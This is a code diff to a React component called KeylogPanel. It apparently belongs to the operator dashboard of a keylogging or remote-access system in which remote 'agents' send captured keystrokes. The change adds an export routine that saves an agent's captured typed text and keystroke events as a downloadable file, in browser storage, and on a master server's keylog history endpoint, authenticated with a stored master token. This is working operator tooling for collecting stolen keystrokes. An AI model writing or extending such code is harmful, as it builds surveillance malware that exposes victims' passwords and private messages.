@@ -1,7 +1,11 @@
 import { useEffect, useRef, useState } from 'react'
 import { dashboardSocket } from '../utils/socket'
 
-export default function KeylogPanel({ open, agentId, agentName, onClose }: { open: boolean; agentId: string; agentName: string; onClose?: () => void }) {
+import React, { forwardRef, useImperativeHandle } from 'react'
+
+export type KeylogPanelHandle = { exportAndSave: () => Promise<void> }
+
+const KeylogPanel = forwardRef<KeylogPanelHandle, { open: boolean; agentId: string; agentName: string; onClose?: () => void }>(function KeylogPanel({ open, agentId, agentName, onClose }, ref) {
   const [words, setWords] = useState<string[]>([])
   const bufRef = useRef<string>('')
   const timerRef = useRef<number | null>(null)
@@ -176,6 +180,26 @@ export default function KeylogPanel({ open, agentId, agentName, onClose }: { ope
     if (el) el.scrollTop = el.scrollHeight
   }, [typed, cursor])
 
+  useImperativeHandle(ref, () => ({
+    async exportAndSave() {
+      try {
+        const text = (typedStateRef.current || '') + '\n\n-- Events --\n' + (words.join('\n')) + '\n'
+        // Download
+        const blob = new Blob([text], { type: 'text/plain;charset=utf-8' })
+        const url = URL.createObjectURL(blob)
+        const a = document.createElement('a'); a.href = url; a.download = `keylog-${agentId}-${Date.now()}.txt`; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
+        // Save local (IndexedDB)
+        try { const mod = await import('../utils/keylogs'); await mod.saveKeylog(agentId, agentName, words) } catch {}
+        // Save to backend history
+        try {
+          const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
+          const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
+          await fetch(`${apiBase}/admin/history/keylog`, { method: 'POST', headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` }, body: JSON.stringify({ agent_id: agentId, agent_name: agentName, text }) })
+        } catch {}
+      } catch {}
+    }
+  }))
+
   return (
     <div style={{ position: 'fixed', top: 0, right: 0, bottom: 0, width: open ? 420 : 0, background: '#0f0f0f', borderLeft: '1px solid #222', overflow: 'hidden', transition: 'width 0.2s ease', zIndex: 1000 }}>
       <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: 10, borderBottom: '1px solid #222' }}>
@@ -209,4 +233,6 @@ export default function KeylogPanel({ open, agentId, agentName, onClose }: { ope
       </div>
     </div>
   )
-}
+})
+
+export default KeylogPanel
